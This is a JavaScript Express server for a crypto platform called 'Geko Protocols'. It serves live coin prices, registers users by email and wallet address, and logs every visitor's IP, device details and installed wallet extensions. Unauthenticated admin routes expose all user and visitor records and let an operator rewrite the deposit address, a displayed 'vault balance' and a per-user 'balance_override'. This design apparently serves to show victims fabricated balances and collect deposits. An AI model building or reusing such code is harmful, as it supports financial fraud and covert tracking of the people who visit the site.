import express from 'express';
import cors from 'cors';
import pg from 'pg';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 5000;

let globalConfig = {
  vault_balance: "25,000.00",
  deposit_address: "0x8f25603fB365f11CB25BD583Ad4e4eFD13F83717"
};

// In-memory user store fallback
let inMemoryUsers = [];

const { Pool } = pg;
let pool = null;
let dbAvailable = false;

if (process.env.DATABASE_URL) {
  pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });

  pool.query(`
    CREATE TABLE IF NOT EXISTS geko_users (
      id SERIAL PRIMARY KEY,
      email TEXT UNIQUE,
      wallet_address TEXT,
      wallet_data JSONB DEFAULT '{}',
      balance_override TEXT,
      ip_address TEXT,
      last_seen TIMESTAMPTZ DEFAULT NOW(),
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `).then(() =>
    pool.query(`
      CREATE TABLE IF NOT EXISTS geko_visitors (
        id SERIAL PRIMARY KEY,
        visitor_id TEXT,
        ip_address TEXT,
        user_agent TEXT,
        language TEXT,
        timezone TEXT,
        screen_size TEXT,
        platform TEXT,
        referrer TEXT,
        page_path TEXT,
        wallet_extensions JSONB DEFAULT '[]',
        visit_count INTEGER DEFAULT 1,
        first_seen TIMESTAMPTZ DEFAULT NOW(),
        last_seen TIMESTAMPTZ DEFAULT NOW()
      )
    `)
  ).then(() => {
    dbAvailable = true;
    console.log('Database ready');
  }).catch(err => {
    console.warn('DB not available, using in-memory store:', err.message);
    dbAvailable = false;
  });
}

let inMemoryVisitors = [];

app.use(cors());
app.use(express.json());

// ─── Config endpoints ──────────────────────────────────────────────────────
app.get('/api/config', (req, res) => {
  res.json(globalConfig);
});

app.post('/api/admin/config', (req, res) => {
  const { vault_balance, deposit_address } = req.body;
  if (vault_balance !== undefined) globalConfig.vault_balance = vault_balance;
  if (deposit_address !== undefined) globalConfig.deposit_address = deposit_address;
  res.json({ success: true, config: globalConfig });
});

// ─── Live prices proxy ─────────────────────────────────────────────────────
app.get('/api/binance/prices', async (req, res) => {
  // Source 1: Kraken (works from Replit servers)
  try {
    const krakenUrl = 'https://api.kraken.com/0/public/Ticker?pair=XBTUSD,ETHUSD,SOLUSD';
    const krakenRes = await fetch(krakenUrl, { headers: { 'Accept': 'application/json' } });
    if (!krakenRes.ok) throw new Error(`Kraken responded ${krakenRes.status}`);
    const krakenData = await krakenRes.json();
    if (krakenData.error && krakenData.error.length > 0) throw new Error(krakenData.error[0]);
    const r = krakenData.result;

    // Kraken pair name lookup helper
    const findPair = (candidates) => {
      for (const c of candidates) {
        if (r[c]) return r[c];
      }
      return null;
    };

    const btc  = findPair(['XXBTZUSD', 'XBTUSD', 'BTCUSD']);
    const eth  = findPair(['XETHZUSD', 'ETHUSD']);
    const sol  = findPair(['SOLUSD', 'SOLXBT']);
    const bnb  = findPair(['BNBUSD']);
    const matic = findPair(['MATICUSD', 'POLOUSD']);

    // Calculate 24h change % from open price
    const change = (pair) => {
      if (!pair) return '0';
      const last = parseFloat(pair.c[0]);
      const open = parseFloat(pair.o);
      return open > 0 ? (((last - open) / open) * 100).toFixed(2) : '0';
    };

    const mapped = [];
    if (btc)   mapped.push({ symbol: 'BTCUSDT',   lastPrice: btc.c[0],   priceChangePercent: change(btc) });
    if (eth)   mapped.push({ symbol: 'ETHUSDT',   lastPrice: eth.c[0],   priceChangePercent: change(eth) });
    if (sol)   mapped.push({ symbol: 'SOLUSDT',   lastPrice: sol.c[0],   priceChangePercent: change(sol) });
    if (bnb)   mapped.push({ symbol: 'BNBUSDT',   lastPrice: bnb.c[0],   priceChangePercent: change(bnb) });
    if (matic) mapped.push({ symbol: 'MATICUSDT', lastPrice: matic.c[0], priceChangePercent: change(matic) });

    if (mapped.length === 0) throw new Error('No pairs returned from Kraken');
    console.log(`Prices from Kraken: BTC=${btc?.c[0]} ETH=${eth?.c[0]} SOL=${sol?.c[0]}`);
    return res.json(mapped);
  } catch (err) {
    console.warn('Kraken failed:', err.message);
  }

  // Source 2: CoinPaprika (also works from Replit)
  try {
    const ids = ['btc-bitcoin','eth-ethereum','sol-solana','bnb-binance-coin','matic-polygon'];
    const results = await Promise.all(
      ids.map(id => fetch(`https://api.coinpaprika.com/v1/tickers/${id}`).then(r => r.json()))
    );
    const symbols = ['BTCUSDT','ETHUSDT','SOLUSDT','BNBUSDT','MATICUSDT'];
    const mapped = results.map((d, i) => ({
      symbol: symbols[i],
      lastPrice: String(d?.quotes?.USD?.price?.toFixed(2) || 0),
      priceChangePercent: String(d?.quotes?.USD?.percent_change_24h?.toFixed(2) || 0)
    }));
    console.log(`Prices from CoinPaprika: BTC=${mapped[0]?.lastPrice}`);
    return res.json(mapped);
  } catch (err2) {
    console.error('All price sources failed:', err2.message);
    return res.status(500).json({ error: 'Price data unavailable' });
  }
});

// ─── Admin User Management ─────────────────────────────────────────────────
app.get('/api/admin/users', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const result = await pool.query('SELECT * FROM geko_users ORDER BY last_seen DESC');
      return res.json(result.rows);
    } catch (e) {
      console.error('DB users error:', e.message);
    }
  }
  res.json(inMemoryUsers);
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data, balance_override } = req.body;

  if (dbAvailable && pool) {
    try {
      const updates = [];
      const values = [];
      let idx = 1;
      if (wallet_data !== undefined) { updates.push(`wallet_data = $${idx++}`); values.push(JSON.stringify(wallet_data)); }
      if (balance_override !== undefined) { updates.push(`balance_override = $${idx++}`); values.push(balance_override); }
      values.push(id);
      if (updates.length > 0) {
        await pool.query(`UPDATE geko_users SET ${updates.join(', ')} WHERE id = $${idx}`, values);
      }
      const result = await pool.query('SELECT * FROM geko_users WHERE id = $1', [id]);
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('DB update error:', e.message);
    }
  }

  // In-memory fallback
  const user = inMemoryUsers.find(u => u.id === id);
  if (user) {
    if (wallet_data !== undefined) user.wallet_data = wallet_data;
    if (balance_override !== undefined) user.balance_override = balance_override;
    return res.json({ success: true, user });
  }
  res.status(404).json({ error: 'User not found' });
});

// Register / upsert a user (called on wallet connect)
app.post('/api/users/upsert', async (req, res) => {
  const { email, wallet_address, wallet_data, ip_address } = req.body;
  if (!email && !wallet_address) return res.status(400).json({ error: 'email or wallet_address required' });

  if (dbAvailable && pool) {
    try {
      const result = await pool.query(
        `INSERT INTO geko_users (email, wallet_address, wallet_data, ip_address, last_seen)
         VALUES ($1, $2, $3, $4, NOW())
         ON CONFLICT (email) DO UPDATE
         SET wallet_address = EXCLUDED.wallet_address,
             wallet_data = EXCLUDED.wallet_data,
             ip_address = EXCLUDED.ip_address,
             last_seen = NOW()
         RETURNING *`,
        [email || null, wallet_address || null, JSON.stringify(wallet_data || {}), ip_address || null]
      );
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('Upsert error:', e.message);
    }
  }

  // In-memory
  const existing = inMemoryUsers.find(u => u.email === email || u.wallet_address === wallet_address);
  if (existing) {
    Object.assign(existing, { wallet_address, wallet_data, ip_address, last_seen: new Date().toISOString() });
    return res.json({ success: true, user: existing });
  }
  const newUser = { id: Date.now(), email, wallet_address, wallet_data, ip_address, last_seen: new Date().toISOString() };
  inMemoryUsers.push(newUser);
  res.json({ success: true, user: newUser });
});

// Get a single user's data (for balance sync)
app.get('/api/user/data', async (req, res) => {
  const { email, address } = req.query;
  if (dbAvailable && pool) {
    try {
      const result = await pool.query(
        'SELECT * FROM geko_users WHERE email = $1 OR wallet_address = $2 LIMIT 1',
        [email || null, address || null]
      );
      if (result.rows.length > 0) return res.json(result.rows[0]);
    } catch (e) {
      console.error('User fetch error:', e.message);
    }
  }
  const user = inMemoryUsers.find(u => u.email === email || u.wallet_address === address);
  if (user) return res.json(user);
  res.status(404).json({ error: 'User not found' });
});

// ─── Visitor tracking (every page load, even without wallet) ───────────────
app.post('/api/visitors/track', async (req, res) => {
  const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '').trim();
  const {
    visitor_id, user_agent, language, timezone,
    screen_size, platform, referrer, page_path, wallet_extensions
  } = req.body || {};

  if (dbAvailable && pool) {
    try {
      const existing = await pool.query('SELECT id, visit_count FROM geko_visitors WHERE visitor_id = $1 LIMIT 1', [visitor_id]);
      if (existing.rows.length) {
        await pool.query(
          `UPDATE geko_visitors SET last_seen = NOW(), visit_count = visit_count + 1,
             ip_address = $2, user_agent = $3, page_path = $4, wallet_extensions = $5
           WHERE visitor_id = $1`,
          [visitor_id, ip, user_agent, page_path, JSON.stringify(wallet_extensions || [])]
        );
      } else {
        await pool.query(
          `INSERT INTO geko_visitors
             (visitor_id, ip_address, user_agent, language, timezone, screen_size, platform, referrer, page_path, wallet_extensions)
           VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)`,
          [visitor_id, ip, user_agent, language, timezone, screen_size, platform, referrer, page_path, JSON.stringify(wallet_extensions || [])]
        );
      }
      return res.json({ success: true });
    } catch (e) {
      console.error('Visitor track error:', e.message);
    }
  }

  const existing = inMemoryVisitors.find(v => v.visitor_id === visitor_id);
  if (existing) {
    existing.visit_count = (existing.visit_count || 1) + 1;
    existing.last_seen = new Date().toISOString();
    existing.ip_address = ip;
    existing.wallet_extensions = wallet_extensions || [];
  } else {
    inMemoryVisitors.push({
      id: Date.now(), visitor_id, ip_address: ip, user_agent, language, timezone,
      screen_size, platform, referrer, page_path, wallet_extensions: wallet_extensions || [],
      visit_count: 1, first_seen: new Date().toISOString(), last_seen: new Date().toISOString()
    });
  }
  res.json({ success: true });
});

app.get('/api/admin/visitors', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const result = await pool.query('SELECT * FROM geko_visitors ORDER BY last_seen DESC LIMIT 500');
      return res.json(result.rows);
    } catch (e) { console.error('Visitor fetch error:', e.message); }
  }
  res.json(inMemoryVisitors.slice().reverse());
});

// ─── Static files & SPA ───────────────────────────────────────────────────
const distPath = path.join(__dirname, 'dist');
app.use(express.static(distPath));

app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'API route not found' });
  }
  const indexPath = path.join(distPath, 'index.html');
  res.sendFile(indexPath, err => {
    if (err) res.sendFile(path.join(__dirname, 'index.html'), err2 => {
      if (err2) res.status(500).send('index.html not found');
    });
  });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Geko Protocols server on port ${port}`);
});
